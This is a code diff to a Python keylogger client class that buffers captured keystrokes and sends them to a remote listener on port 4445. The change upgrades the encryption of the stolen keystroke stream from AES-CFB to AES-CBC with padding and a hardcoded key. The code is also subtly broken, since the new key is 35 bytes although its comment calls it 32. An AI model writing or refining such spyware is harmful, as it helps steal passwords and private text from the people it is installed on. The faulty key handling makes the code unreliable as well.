@@ -14,7 +14,7 @@ PORT = 4445
 BUFFER_THRESHOLD = 20  # Characters before sending
 MAX_DELAY = 2.0  # Maximum seconds between sends
 RECONNECT_BASE_DELAY = 1.0
-ENCRYPTION_KEY = b'your-secret-key-32'  # 32-byte key for AES
+ENCRYPTION_KEY = b'this-is-a-32-byte-key-for-aes-256!!'  # 32 characters
 
 
 class KeyLoggerClient:
@@ -109,19 +109,28 @@ class KeyLoggerClient:
                     print(f"Send failed: {e}")
                     self.connection_event.clear()
 
+    # Update the encryption method
     def _encrypt(self, data):
-        """AES encryption (requires cryptography library)"""
+        """Proper AES-256-CBC encryption"""
         from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
         from cryptography.hazmat.backends import default_backend
+        from cryptography.hazmat.primitives import padding
 
+        # Generate proper IV
         iv = os.urandom(16)
+
+        # Add padding
+        padder = padding.PKCS7(128).padder()
+        padded_data = padder.update(data) + padder.finalize()
+
+        # Create cipher
         cipher = Cipher(
             algorithms.AES(ENCRYPTION_KEY),
-            modes.CFB(iv),
+            modes.CBC(iv),
             backend=default_backend()
         )
         encryptor = cipher.encryptor()
-        return iv + encryptor.update(data) + encryptor.finalize()
+        return iv + encryptor.update(padded_data) + encryptor.finalize()
 
     def stop(self):
         """Graceful shutdown"""
